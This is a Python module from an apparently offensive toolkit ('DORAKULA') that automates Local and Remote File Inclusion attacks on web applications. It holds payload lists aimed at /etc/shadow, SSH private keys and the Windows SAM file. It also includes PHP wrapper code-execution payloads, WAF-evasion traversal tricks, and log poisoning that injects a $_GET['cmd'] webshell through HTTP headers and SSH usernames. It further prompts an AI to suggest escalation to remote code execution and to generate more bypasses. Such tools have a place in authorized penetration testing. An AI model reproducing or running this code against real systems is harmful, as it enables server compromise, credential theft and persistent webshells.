#!/usr/bin/env python3
"""DORAKULA LFI Tester - Local/Remote File Inclusion Detection & Exploitation

Comprehensive LFI/RFI testing module covering basic LFI, RFI, PHP wrapper
abuse, log poisoning for RCE, and AI-enhanced bypass payload generation.
"""

import asyncio
import json
import logging
import re
from typing import Dict, List, Any, Optional
from urllib.parse import urlparse, urlencode, quote

logger = logging.getLogger(__name__)


class LFITester:
    """Advanced Local/Remote File Inclusion tester with PHP wrapper and log poisoning.

    Tests for LFI and RFI vulnerabilities including PHP protocol wrappers
    (php://, data://, expect://), log poisoning for RCE escalation,
    and generates AI-enhanced bypass payloads for WAF evasion.

    Attributes:
        ai_router: AI router instance for intelligent payload generation.
        timeout: Default timeout for HTTP requests in seconds.
    """

    # Common LFI payload paths
    LFI_PATHS: List[Dict[str, str]] = [
        {"path": "/etc/passwd", "indicator": "root:x:", "description": "Linux passwd file"},
        {"path": "/etc/hosts", "indicator": "127.0.0.1", "description": "Linux hosts file"},
        {"path": "/etc/shadow", "indicator": "root:", "description": "Linux shadow file"},
        {"path": "/etc/issue", "indicator": "\\n", "description": "Linux OS identification"},
        {"path": "/proc/self/environ", "indicator": "USER=", "description": "Process environment"},
        {"path": "/proc/self/cmdline", "indicator": "", "description": "Process command line"},
        {"path": "/proc/self/fd/0", "indicator": "", "description": "Process file descriptor"},
        {"path": "/var/log/apache2/access.log", "indicator": "GET ", "description": "Apache access log"},
        {"path": "/var/log/apache2/error.log", "indicator": "error", "description": "Apache error log"},
        {"path": "/var/log/nginx/access.log", "indicator": "GET ", "description": "Nginx access log"},
        {"path": "/var/log/auth.log", "indicator": "session", "description": "Auth log"},
        {"path": "/etc/mysql/my.cnf", "indicator": "mysql", "description": "MySQL config"},
        {"path": "/etc/php/php.ini", "indicator": "php", "description": "PHP config"},
        {"path": "/etc/php/7.4/apache2/php.ini", "indicator": "php", "description": "PHP 7.4 config"},
        {"path": "/etc/php/8.1/apache2/php.ini", "indicator": "php", "description": "PHP 8.1 config"},
        {"path": "/home/user/.bash_history", "indicator": "", "description": "Bash history"},
        {"path": "/home/user/.ssh/id_rsa", "indicator": "BEGIN RSA", "description": "SSH private key"},
        {"path": "/etc/ssh/sshd_config", "indicator": "Port ", "description": "SSH config"},
        {"path": "C:/Windows/System32/drivers/etc/hosts", "indicator": "127.0.0.1", "description": "Windows hosts"},
        {"path": "C:/Windows/win.ini", "indicator": "[fonts]", "description": "Windows ini file"},
        {"path": "C:/Windows/System32/config/SAM", "indicator": "", "description": "Windows SAM"},
    ]

    # PHP wrapper payloads
    PHP_WRAPPERS: List[Dict[str, str]] = [
        {"wrapper": "php://filter", "payload": "php://filter/convert.base64-encode/resource=index.php", "description": "Base64 source disclosure"},
        {"wrapper": "php://filter", "payload": "php://filter/read=convert.base64-encode/resource=/etc/passwd", "description": "Base64 file read"},
        {"wrapper": "php://filter", "payload": "php://filter/read=string.rot13/resource=index.php", "description": "ROT13 source disclosure"},
        {"wrapper": "php://filter", "payload": "php://filter/read=string.toupper/resource=index.php", "description": "Uppercase filter"},
        {"wrapper": "php://filter", "payload": "php://filter/write=convert.base64-decode/resource=shell.php", "description": "Write via filter"},
        {"wrapper": "php://input", "payload": "php://input", "description": "PHP input stream (POST body execution)", "needs_post": True, "post_data": "<?php system('id'); ?>"},
        {"wrapper": "data://", "payload": "data://text/plain;base64,PD9waHAgc3lzdGVtKCdpZCcpOyA/Pg==", "description": "Data URI code execution"},
        {"wrapper": "data://", "payload": "data://text/plain,<?php system('id'); ?>", "description": "Data URI plain text"},
        {"wrapper": "expect://", "payload": "expect://id", "description": "Expect wrapper command execution"},
        {"wrapper": "phar://", "payload": "phar:///tmp/shell.phar", "description": "Phar archive execution"},
        {"wrapper": "zip://", "payload": "zip:///tmp/shell.zip%23shell.php", "description": "Zip archive inclusion"},
    ]

    def __init__(self, ai_router: Any = None, timeout: int = 30):
        """Initialize LFITester.

        Args:
            ai_router: AIRouter instance for AI-enhanced operations.
            timeout: Default request timeout in seconds.
        """
        self.ai_router = ai_router
        self.timeout = timeout
        logger.info("LFITester initialized with timeout=%d", timeout)

    async def test_lfi(self, target: str, parameter: str) -> Dict[str, Any]:
        """Test Local File Inclusion on the specified parameter.

        Injects LFI payloads into the target parameter, testing traversal
        sequences and common file paths. Detects successful inclusion by
        matching response content against known indicators.

        Args:
            target: Target URL with injectable parameter.
            parameter: Parameter name to test for LFI.

        Returns:
            Dictionary containing:
                - findings: Confirmed LFI vulnerabilities
                - potential: Potential LFI indicators
                - readable_files: Successfully read files
                - tested_payloads: Count of payloads tested
                - errors: List of any errors encountered
        """
        results: Dict[str, Any] = {
            "target": target,
            "parameter": parameter,
            "findings": [],
            "potential": [],
            "readable_files": [],
            "tested_payloads": 0,
            "errors": [],
        }

        parsed = urlparse(target)
        base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"

        # Traversal depth variations
        traversal_prefixes: List[str] = [
            "",                         # Direct path
            "../",                      # 1 level
            "../../",                   # 2 levels
            "../../../",                # 3 levels
            "../../../../",             # 4 levels
            "../../../../../",          # 5 levels
            "../../../../../../",       # 6 levels
            "../../../../../../../",    # 7 levels
            "../../../../../../../../", # 8 levels
            "....//",                   # Double-dot bypass
            "....//....//....//",       # Double-dot triple
            "..%2f",                    # URL-encoded slash
            "..%2f..%2f..%2f",          # Triple URL-encoded
            "..%252f",                  # Double URL-encoded
            "..%c0%af",                # Unicode bypass
            "..%ef%bc%8f",             # Fullwidth slash
        ]

        for lfi_entry in self.LFI_PATHS:
            file_path = lfi_entry["path"]
            indicator = lfi_entry["indicator"]

            for prefix in traversal_prefixes:
                payload = prefix + file_path
                results["tested_payloads"] += 1

                try:
                    inject_url = f"{base_url}?{parameter}={quote(payload, safe='')}"
                    cmd = [
                        "curl", "-s",
                        "--max-time", str(self.timeout),
                        "-L",
                        inject_url,
                    ]
                    proc = await asyncio.create_subprocess_exec(
                        *cmd,
                        stdout=asyncio.subprocess.PIPE,
                        stderr=asyncio.subprocess.PIPE,
                    )
                    stdout, stderr = await asyncio.wait_for(
                        proc.communicate(), timeout=self.timeout + 5
                    )
                    response = stdout.decode("utf-8", errors="replace")

                    # Check for indicators
                    if indicator and indicator in response:
                        results["findings"].append({
                            "file": file_path,
                            "prefix": prefix,
                            "payload": payload,
                            "indicator_found": indicator,
                            "response_length": len(response),
                            "response_snippet": response[:500],
                        })
                        if file_path not in [f["file"] for f in results["readable_files"]]:
                            results["readable_files"].append({
                                "file": file_path,
                                "prefix": prefix,
                                "content_preview": response[:1000],
                            })
                        break  # Found working depth, skip remaining prefixes

                    # Heuristic: check for common LFI response patterns
                    lfi_patterns = [
                        r"root:[x\*]:0:0:",      # passwd entry
                        r"BEGIN (?:RSA |DSA |EC |OPENSSH )?PRIVATE KEY",
                        r"<\?php",                 # PHP source
                        r"DocumentRoot",           # Apache config
                    ]
                    for pattern in lfi_patterns:
                        if re.search(pattern, response):
                            results["potential"].append({
                                "file": file_path,
                                "prefix": prefix,
                                "payload": payload,
                                "pattern_match": pattern,
                            })
                            break

                except asyncio.TimeoutError:
                    if results["tested_payloads"] % 50 == 0:
                        logger.debug("LFI test progress: %d payloads tested",
                                     results["tested_payloads"])
                except OSError as exc:
                    results["errors"].append(f"Request error: {exc}")

        # Null byte injection tests
        null_byte_payloads: List[str] = [
            "/etc/passwd%00",
            "/etc/passwd%00.jpg",
            "/etc/passwd%00.png",
            "/etc/passwd%00.html",
            "/etc/passwd\x00",
        ]
        for nb_payload in null_byte_payloads:
            results["tested_payloads"] += 1
            try:
                inject_url = f"{base_url}?{parameter}={quote(nb_payload, safe='%')}"
                cmd = ["curl", "-s", "--max-time", str(self.timeout), inject_url]
                proc = await asyncio.create_subprocess_exec(
                    *cmd,
                    stdout=asyncio.subprocess.PIPE,
                    stderr=asyncio.subprocess.PIPE,
                )
                stdout, _ = await asyncio.wait_for(
                    proc.communicate(), timeout=self.timeout + 5
                )
                response = stdout.decode("utf-8", errors="replace")
                if "root:x:" in response:
                    results["findings"].append({
                        "file": "/etc/passwd",
                        "prefix": "null_byte",
                        "payload": nb_payload,
                        "indicator_found": "root:x:",
                        "note": "Null byte truncation works",
                    })
                    break
            except asyncio.TimeoutError:
                pass
            except OSError:
                pass

        # AI analysis
        if self.ai_router and results["findings"]:
            try:
                ai_result = await self.ai_router.query(
                    f"LFI vulnerabilities found. Analyze impact and suggest "
                    f"escalation to RCE:\n"
                    f"Findings: {json.dumps(results['findings'][:5], indent=2)}\n"
                    f"Readable files: {json.dumps(results['readable_files'][:5], indent=2)}",
                    context="lfi_analysis"
                )
                results["ai_analysis"] = ai_result
            except (AttributeError, OSError, RuntimeError) as exc:
                logger.warning("AI LFI analysis failed: %s", exc)

        logger.info("LFI test complete: %d findings, %d readable files, %d payloads tested",
                     len(results["findings"]), len(results["readable_files"]),
                     results["tested_payloads"])
        return results

    async def test_rfi(self, target: str, parameter: str) -> Dict[str, Any]:
        """Test Remote File Inclusion on the specified parameter.

        Attempts to include a remote file via HTTP and other protocols,
        detecting RFI if the remote content is executed or reflected.

        Args:
            target: Target URL with injectable parameter.
            parameter: Parameter name to test for RFI.

        Returns:
            Dictionary containing:
                - findings: Confirmed RFI vulnerabilities
                - tested_payloads: RFI payloads tested
                - errors: List of any errors encountered
        """
        results: Dict[str, Any] = {
            "target": target,
            "parameter": parameter,
            "findings": [],
            "tested_payloads": [],
            "errors": [],
        }

        parsed = urlparse(target)
        base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"

        # RFI test payloads - using known-safe test domains
        rfi_payloads: List[Dict[str, str]] = [
            {
                "payload": "http://example.com/",
                "description": "HTTP remote include",
                "indicator": "Example Domain",
            },
            {
                "payload": "https://example.com/",
                "description": "HTTPS remote include",
                "indicator": "Example Domain",
            },
            {
                "payload": "ftp://example.com/",
                "description": "FTP protocol include",
                "indicator": "",
            },
        ]

        # PHP wrapper RFI payloads
        rfi_payloads.extend([
            {
                "payload": "data://text/plain,<?php echo 'RFI_TEST_MARKER'; ?>",
                "description": "Data URI with PHP code",
                "indicator": "RFI_TEST_MARKER",
            },
            {
                "payload": "data://text/plain;base64,PD9waHAgZWNobyAnUkZJX1RFU1RfTUFSS0VSJzsgPz4=",
                "description": "Base64 data URI with PHP code",
                "indicator": "RFI_TEST_MARKER",
            },
        ])

        for rfi_entry in rfi_payloads:
            try:
                inject_url = f"{base_url}?{parameter}={quote(rfi_entry['payload'], safe='')}"
                cmd = [
                    "curl", "-s",
                    "--max-time", str(self.timeout),
                    inject_url,
                ]
                proc = await asyncio.create_subprocess_exec(
                    *cmd,
                    stdout=asyncio.subprocess.PIPE,
                    stderr=asyncio.subprocess.PIPE,
                )
                stdout, _ = await asyncio.wait_for(
                    proc.communicate(), timeout=self.timeout + 5
                )
                response = stdout.decode("utf-8", errors="replace")

                results["tested_payloads"].append({
                    "payload": rfi_entry["payload"],
                    "description": rfi_entry["description"],
                    "response_length": len(response),
                })

                if rfi_entry["indicator"] and rfi_entry["indicator"] in response:
                    results["findings"].append({
                        "type": "rfi_confirmed",
                        "payload": rfi_entry["payload"],
                        "description": rfi_entry["description"],
                        "indicator": rfi_entry["indicator"],
                        "response_snippet": response[:500],
                    })

            except asyncio.TimeoutError:
                results["errors"].append(
                    f"Timeout testing {rfi_entry['description']}"
                )
            except OSError as exc:
                results["errors"].append(f"Request error: {exc}")

        if self.ai_router and results["findings"]:
            try:
                ai_result = await self.ai_router.query(
                    f"RFI vulnerability confirmed. Suggest RCE exploitation techniques:\n"
                    f"{json.dumps(results['findings'], indent=2)}",
                    context="rfi_exploitation"
                )
                results["ai_exploitation"] = ai_result
            except (AttributeError, OSError, RuntimeError) as exc:
                logger.warning("AI RFI analysis failed: %s", exc)

        logger.info("RFI test complete: %d findings", len(results["findings"]))
        return results

    async def test_wrapper(self, target: str) -> Dict[str, Any]:
        """Test PHP protocol wrappers for file disclosure and code execution.

        Tests php://filter, php://input, data://, expect://, phar://,
        and zip:// wrappers for LFI/RFI bypass and RCE.

        Args:
            target: Target URL with injectable parameter.

        Returns:
            Dictionary containing:
                - wrapper_results: Test results per wrapper type
                - source_disclosure: Successfully disclosed source files
                - rce_vectors: Remote code execution vectors found
                - errors: List of any errors encountered
        """
        results: Dict[str, Any] = {
            "target": target,
            "wrapper_results": [],
            "source_disclosure": [],
            "rce_vectors": [],
            "errors": [],
        }

        parsed = urlparse(target)
        base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"

        # Find injectable parameters
        params_to_test: List[str] = ["page", "file", "path", "include", "template",
                                      "view", "doc", "document", "content", "dir"]

        if parsed.query:
            for param in parsed.query.split("&"):
                name = param.split("=")[0] if "=" in param else param
                params_to_test.insert(0, name)

        for wrapper_entry in self.PHP_WRAPPERS:
            for param in params_to_test[:5]:
                try:
                    payload = wrapper_entry["payload"]
                    inject_url = f"{base_url}?{param}={quote(payload, safe='')}"
                    needs_post = wrapper_entry.get("needs_post", False)
                    post_data = wrapper_entry.get("post_data", "")

                    cmd = ["curl", "-s", "--max-time", str(self.timeout)]
                    if needs_post and post_data:
                        cmd.extend(["-X", "POST", "-d", post_data])
                    cmd.append(inject_url)

                    proc = await asyncio.create_subprocess_exec(
                        *cmd,
                        stdout=asyncio.subprocess.PIPE,
                        stderr=asyncio.subprocess.PIPE,
                    )
                    stdout, _ = await asyncio.wait_for(
                        proc.communicate(), timeout=self.timeout + 5
                    )
                    response = stdout.decode("utf-8", errors="replace")

                    entry: Dict[str, Any] = {
                        "wrapper": wrapper_entry["wrapper"],
                        "payload": payload,
                        "parameter": param,
                        "description": wrapper_entry["description"],
                        "response_length": len(response),
                        "status": "no_indicators",
                    }

                    # Check for base64-encoded source disclosure
                    if "php://filter" in payload and "base64" in payload:
                        # Try to decode base64 content from response
                        b64_pattern = re.findall(r'[A-Za-z0-9+/]{50,}={0,2}', response)
                        for b64_str in b64_pattern[:3]:
                            try:
                                import base64 as b64mod
                                decoded = b64mod.b64decode(b64_str).decode("utf-8", errors="replace")
                                if "<?php" in decoded or "<?=" in decoded:
                                    entry["status"] = "source_disclosed"
                                    entry["decoded_source"] = decoded[:2000]
                                    results["source_disclosure"].append({
                                        "parameter": param,
                                        "source_preview": decoded[:1000],
                                        "encoding": "base64",
                                    })
                                    break
                            except Exception as e:
                                logger.debug("Base64 decode failed: %s", e)
                                continue

                    # Check for RCE indicators
                    rce_indicators = ["uid=", "gid=", "groups=", "RFI_TEST_MARKER"]
                    for indicator in rce_indicators:
                        if indicator in response:
                            entry["status"] = "rce_confirmed"
                            entry["rce_output"] = response[:500]
                            results["rce_vectors"].append({
                                "wrapper": wrapper_entry["wrapper"],
                                "parameter": param,
                                "payload": payload,
                                "output": response[:500],
                            })
                            break

                    # Check for expect/data wrapper success
                    if wrapper_entry["wrapper"] in ("expect://", "data://") and len(response) > 100:
                        if "uid=" in response or "root" in response:
                            entry["status"] = "rce_confirmed"
                            results["rce_vectors"].append({
                                "wrapper": wrapper_entry["wrapper"],
                                "parameter": param,
                                "payload": payload,
                                "output": response[:500],
                            })

                    results["wrapper_results"].append(entry)

                except asyncio.TimeoutError:
                    results["errors"].append(
                        f"Timeout testing {wrapper_entry['wrapper']} on {param}"
                    )
                except OSError as exc:
                    results["errors"].append(f"Request error: {exc}")

        if self.ai_router and (results["source_disclosure"] or results["rce_vectors"]):
            try:
                ai_result = await self.ai_router.query(
                    f"PHP wrapper testing results. Analyze:\n"
                    f"Source disclosures: {len(results['source_disclosure'])}\n"
                    f"RCE vectors: {json.dumps(results['rce_vectors'][:3], indent=2)}",
                    context="php_wrapper_analysis"
                )
                results["ai_analysis"] = ai_result
            except (AttributeError, OSError, RuntimeError) as exc:
                logger.warning("AI wrapper analysis failed: %s", exc)

        logger.info("PHP wrapper test complete: %d source disclosures, %d RCE vectors",
                     len(results["source_disclosure"]), len(results["rce_vectors"]))
        return results

    async def test_log_poisoning(self, target: str) -> Dict[str, Any]:
        """Test log poisoning for LFI-to-RCE escalation.

        Attempts to poison server log files (Apache access log, error log,
        auth log, SSH log) via malicious User-Agent or request injection,
        then includes the log file to execute injected code.

        Args:
            target: Target URL with LFI vulnerability.

        Returns:
            Dictionary containing:
                - log_paths: Log files found readable
                - poisoning_attempts: Poisoning injection attempts
                - rce_confirmed: Whether RCE was achieved
                - errors: List of any errors encountered
        """
        results: Dict[str, Any] = {
            "target": target,
            "log_paths": [],
            "poisoning_attempts": [],
            "rce_confirmed": False,
            "errors": [],
        }

        # PHP code to inject via User-Agent
        poison_payloads: List[Dict[str, str]] = [
            {
                "header_name": "User-Agent",
                "header_value": "<?php system('id'); ?>",
                "description": "User-Agent PHP code injection",
            },
            {
                "header_name": "User-Agent",
                "header_value": "<?php echo shell_exec($_GET[\\'cmd\\']); ?>",
                "description": "User-Agent webshell injection",
            },
            {
                "header_name": "Referer",
                "header_value": "<?php system('id'); ?>",
                "description": "Referer PHP code injection",
            },
            {
                "header_name": "Cookie",
                "header_value": "session=<?php system('id'); ?>",
                "description": "Cookie PHP code injection",
            },
        ]

        log_paths: List[str] = [
            "/var/log/apache2/access.log",
            "/var/log/apache2/error.log",
            "/var/log/nginx/access.log",
            "/var/log/nginx/error.log",
            "/var/log/auth.log",
            "/var/log/syslog",
            "/var/log/mail.log",
            "/var/log/apache/access.log",
            "/var/log/apache/error.log",
            "/usr/local/apache/logs/access.log",
            "/usr/local/apache/logs/error.log",
        ]

        parsed = urlparse(target)
        base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"

        # Step 1: Poison the logs
        for poison in poison_payloads:
            try:
                cmd = [
                    "curl", "-s",
                    "-H", f"{poison['header_name']}: {poison['header_value']}",
                    "--max-time", str(self.timeout),
                    target,
                ]
                proc = await asyncio.create_subprocess_exec(
                    *cmd,
                    stdout=asyncio.subprocess.PIPE,
                    stderr=asyncio.subprocess.PIPE,
                )
                stdout, _ = await asyncio.wait_for(
                    proc.communicate(), timeout=self.timeout + 5
                )
                results["poisoning_attempts"].append({
                    "header": poison["header_name"],
                    "payload": poison["header_value"],
                    "description": poison["description"],
                    "status": "injected",
                    "response_code": len(stdout),
                })
            except asyncio.TimeoutError:
                results["errors"].append(f"Timeout poisoning via {poison['header_name']}")
            except OSError as exc:
                results["errors"].append(f"Poisoning error: {exc}")

        # Step 2: Include log files to trigger RCE
        lfi_params: List[str] = ["page", "file", "path", "include", "template", "view"]
        if parsed.query:
            for param in parsed.query.split("&"):
                name = param.split("=")[0] if "=" in param else param
                lfi_params.insert(0, name)

        for log_path in log_paths:
            for param in lfi_params[:3]:
                try:
                    # Include with command parameter
                    inject_url = f"{base_url}?{param}={quote(log_path, safe='')}&cmd=id"
                    cmd = ["curl", "-s", "--max-time", str(self.timeout), inject_url]
                    proc = await asyncio.create_subprocess_exec(
                        *cmd,
                        stdout=asyncio.subprocess.PIPE,
                        stderr=asyncio.subprocess.PIPE,
                    )
                    stdout, _ = await asyncio.wait_for(
                        proc.communicate(), timeout=self.timeout + 5
                    )
                    response = stdout.decode("utf-8", errors="replace")

                    # Check for RCE
                    if "uid=" in response and ("gid=" in response or "root" in response):
                        results["rce_confirmed"] = True
                        results["log_paths"].append({
                            "path": log_path,
                            "parameter": param,
                            "status": "rce_achieved",
                            "output": response[:500],
                        })
                        break

                    # Check if log file is readable at all
                    log_indicators = ["GET ", "POST ", "HTTP/", "error", "warning", "notice"]
                    for indicator in log_indicators:
                        if indicator in response:
                            results["log_paths"].append({
                                "path": log_path,
                                "parameter": param,
                                "status": "readable",
                                "response_length": len(response),
                            })
                            break

                except asyncio.TimeoutError:
                    pass
                except OSError as exc:
                    results["errors"].append(f"Log inclusion error: {exc}")

            if results["rce_confirmed"]:
                break

        # SSH log poisoning attempt
        try:
            ssh_payload = "ssh '<?php system($_GET[\\'cmd\\']); ?>'@target"
            cmd = ["ssh", "-o", "StrictHostKeyChecking=no",
                   "-o", "ConnectTimeout=5",
                   "'<?php system(id); ?>'@target"]
            proc = await asyncio.create_subprocess_exec(
                *cmd,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE,
            )
            await asyncio.wait_for(proc.communicate(), timeout=10)
            # SSH will fail but the username may be logged
        except (asyncio.TimeoutError, OSError):
            pass  # Expected to fail

        if self.ai_router:
            try:
                ai_result = await self.ai_router.query(
                    f"Log poisoning test results for {target}:\n"
                    f"RCE confirmed: {results['rce_confirmed']}\n"
                    f"Readable logs: {len(results['log_paths'])}\n"
                    f"Suggest alternative log poisoning techniques and "
                    f"escalation methods if RCE was not achieved.",
                    context="log_poisoning_analysis"
                )
                results["ai_suggestions"] = ai_result
            except (AttributeError, OSError, RuntimeError) as exc:
                logger.warning("AI log poisoning analysis failed: %s", exc)

        logger.info("Log poisoning test complete: RCE=%s, %d readable logs",
                     results["rce_confirmed"], len(results["log_paths"]))
        return results

    async def generate_bypasses(self, target: str) -> Dict[str, Any]:
        """Generate AI-enhanced LFI bypass payloads for WAF evasion.

        Creates comprehensive bypass payloads using encoding tricks,
        path obfuscation, and AI-suggested techniques.

        Args:
            target: Target URL for context-aware bypass generation.

        Returns:
            Dictionary containing:
                - bypass_payloads: List of bypass payloads with metadata
                - categories: Bypass categories used
                - ai_payloads: AI-generated bypass payloads
        """
        bypass_payloads: List[Dict[str, Any]] = []

        # Path traversal bypasses
        traversal_bypasses: List[Dict[str, str]] = [
            {"payload": "....//....//....//etc/passwd", "category": "double_dot", "description": "Double-dot traversal"},
            {"payload": "..%2f..%2f..%2fetc/passwd", "category": "url_encode", "description": "URL-encoded traversal"},
            {"payload": "..%252f..%252f..%252fetc/passwd", "category": "double_encode", "description": "Double URL-encoded"},
            {"payload": "..%c0%af..%c0%af..%c0%afetc/passwd", "category": "unicode_encode", "description": "Unicode-encoded traversal"},
            {"payload": "..%ef%bc%8f..%ef%bc%8fetc/passwd", "category": "fullwidth", "description": "Fullwidth slash bypass"},
            {"payload": "/etc/passwd%00", "category": "null_byte", "description": "Null byte truncation"},
            {"payload": "/etc/passwd%00.jpg", "category": "null_byte", "description": "Null byte with extension"},
            {"payload": "/etc/passwd%0a", "category": "newline_injection", "description": "Newline injection"},
            {"payload": "/etc/./passwd", "category": "path_normalization", "description": "Path normalization bypass"},
            {"payload": "/etc/passwd%23", "category": "fragment_bypass", "description": "Fragment bypass"},
            {"payload": "/etc/passwd%3f", "category": "query_bypass", "description": "Query string bypass"},
            {"payload": "....\\/....\\/....\\/etc/passwd", "category": "backslash", "description": "Backslash traversal"},
        ]

        # Encoding bypasses for specific paths
        encoding_bypasses: List[Dict[str, str]] = [
            {"payload": "%2f%65%74%63%2f%70%61%73%73%77%64", "category": "full_url_encode", "description": "Fully URL-encoded path"},
            {"payload": "/etc/passwd%2500", "category": "double_encode_null", "description": "Double-encoded null"},
            {"payload": "file:///etc/passwd", "category": "file_protocol", "description": "File protocol wrapper"},
            {"payload": "/???/??????", "category": "wildcard", "description": "Glob wildcard bypass"},
        ]

        # Windows-specific bypasses
        windows_bypasses: List[Dict[str, str]] = [
            {"payload": "C:\\Windows\\System32\\drivers\\etc\\hosts", "category": "windows_path", "description": "Windows hosts file"},
            {"payload": "C:/Windows/System32/drivers/etc/hosts", "category": "windows_forward", "description": "Windows forward-slash"},
            {"payload": "..\\..\\..\\Windows\\win.ini", "category": "windows_traversal", "description": "Windows traversal"},
        ]

        bypass_payloads.extend(
            [{"payload": b["payload"], "category": b["category"], "description": b["description"]}
             for b in traversal_bypasses + encoding_bypasses + windows_bypasses]
        )

        # AI enhancement
        ai_payloads: List[Dict[str, str]] = []
        if self.ai_router:
            try:
                ai_result = await self.ai_router.query(
                    f"Generate 15 advanced LFI bypass payloads for target {target}. "
                    f"Include: path traversal variations, encoding tricks, "
                    f"PHP wrapper chains, filter bypass combos, and "
                    f"server-specific techniques (Apache, Nginx, IIS). "
                    f"Format: one payload per line with brief description.",
                    context="lfi_bypass_generation"
                )
                if ai_result:
                    for line in ai_result.splitlines():
                        line = line.strip()
                        if line and not line.startswith("#") and len(line) < 500:
                            ai_payloads.append({
                                "payload": line,
                                "category": "ai_generated",
                                "description": "AI-generated LFI bypass",
                            })
            except (AttributeError, OSError, RuntimeError) as exc:
                logger.warning("AI LFI bypass generation failed: %s", exc)

        categories = list(set(p["category"] for p in bypass_payloads))

        result: Dict[str, Any] = {
            "target": target,
            "bypass_payloads": bypass_payloads,
            "ai_payloads": ai_payloads,
            "categories": categories,
            "total_count": len(bypass_payloads) + len(ai_payloads),
        }

        logger.info("Generated %d LFI bypass payloads across %d categories",
                     result["total_count"], len(categories))
        return result
